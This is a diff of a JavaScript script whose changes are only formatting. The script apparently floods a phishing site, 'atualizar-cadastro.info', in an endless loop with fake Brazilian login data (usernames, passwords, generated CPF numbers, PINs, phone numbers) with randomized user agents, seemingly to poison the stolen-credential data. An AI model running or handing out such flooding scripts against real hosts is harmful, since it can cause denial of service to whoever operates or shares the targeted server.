@@ -12,34 +12,34 @@ const randomIntegerString = (length) => {
   return fillWithIntegers(emptyArray(length)).join('')
 }
 
-const randomPhoneNumber = () => faker.helpers.replaceSymbolWithNumber("##+#-####-####")
+const randomPhoneNumber = () => faker.helpers.replaceSymbolWithNumber('##+#-####-####')
 
 const totallyLegitHeaders = () => {
   return {
     'User-Agent': faker.internet.userAgent(),
-    'Content-Type': 'application/x-www-form-urlencoded',
+    'Content-Type': 'application/x-www-form-urlencoded'
   }
 }
 
-function* totallyLegitRunData() {
+function * totallyLegitRunData () {
   yield {
     usuario: faker.internet.userName().toLowerCase(),
     senha: faker.internet.password(),
-    step: 'passo1',
+    step: 'passo1'
   }
 
   yield {
     cpf: cpf.generate(),
-    senha1:  randomIntegerString(6),
-    telefone:  randomPhoneNumber(),
-    step: 'passo2',
+    senha1: randomIntegerString(6),
+    telefone: randomPhoneNumber(),
+    step: 'passo2'
   }
 }
 
 const postOptions = () => {
   return {
     baseURL: 'http://atualizar-cadastro.info',
-    headers: totallyLegitHeaders(),
+    headers: totallyLegitHeaders()
   }
 }
 
@@ -59,12 +59,12 @@ const requestForData = async (data) => {
 }
 
 const singleRun = async () => {
-  for (postData of totallyLegitRunData()) {
+  for (const postData of totallyLegitRunData()) {
     await requestForData(postData)
   }
 }
 
-(async function infiniteFlood() {
+(async function infiniteFlood () {
   let tries = 0
   while (true) {
     console.log(`session number ${++tries}`)
